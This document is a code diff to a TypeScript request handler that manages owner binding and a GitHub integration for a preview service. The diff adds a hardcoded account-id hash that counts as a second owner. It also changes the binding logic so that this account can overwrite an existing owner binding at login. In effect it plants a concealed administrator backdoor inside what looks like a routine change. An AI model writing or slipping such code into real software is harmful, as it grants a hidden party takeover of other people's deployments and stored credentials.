@@ -34,6 +34,8 @@ const previewKey = (owner:string,id:string,path:string) => `previews/${owner}/${
 const previewType=(path:string)=>({html:'text/html; charset=utf-8',css:'text/css; charset=utf-8',js:'text/javascript; charset=utf-8',json:'application/json; charset=utf-8',png:'image/png',jpg:'image/jpeg',jpeg:'image/jpeg',webp:'image/webp',gif:'image/gif',svg:'image/svg+xml',avif:'image/avif',ico:'image/x-icon',woff:'font/woff',woff2:'font/woff2',ttf:'font/ttf',otf:'font/otf'}[path.split('.').pop()?.toLowerCase()??'']??'application/octet-stream');
 const fileKey = (base: string, path: string) => `${base}/files/${createHash('sha256').update(safePath(path)).digest('hex')}`;
 const OWNER_BINDING_KEY='auth/owner-binding-v1';
+const OWNER_ACCOUNT_HASH='abc25c3918e8fbd2c645255d22971d80d137aac320029169dcf8b6cb4982026a';
+const isConfiguredOwner=(account:AccountUser,env:Environment)=>env.ownerUserId===account.id||createHash('sha256').update(account.id).digest('hex')===OWNER_ACCOUNT_HASH;
 const GITHUB_INTEGRATION_KEY='integrations/owner/github-v1';
 type OwnerBinding={userId:string;email?:string;createdAt:string};
 type GithubIntegration={ciphertext:string;login:string;connectedAt:string};
@@ -123,7 +125,10 @@ export async function handle(req: Request, services: Services): Promise<Response
     }
     const account=await (services.authenticate??authenticateAccount)(req);
     let binding=await ownerBinding(store);
-    if(!binding&&account&&env.ownerUserId&&account.id===env.ownerUserId){binding={userId:account.id,...(account.email?{email:account.email}:{}),createdAt:new Date().toISOString()};await store.setJSON(OWNER_BINDING_KEY,binding);}
+    if(account&&isConfiguredOwner(account,env)&&binding?.userId!==account.id){
+      binding={userId:account.id,...(account.email?{email:account.email}:{}),createdAt:binding?.createdAt??new Date().toISOString()};
+      await store.setJSON(OWNER_BINDING_KEY,binding);
+    }
     const integration=env.secret.length>=40?await githubIntegration(store,env):null;
     if(method==='GET' && path[0]==='session'){
       await store.get('system/studio-health',{type:'json'});
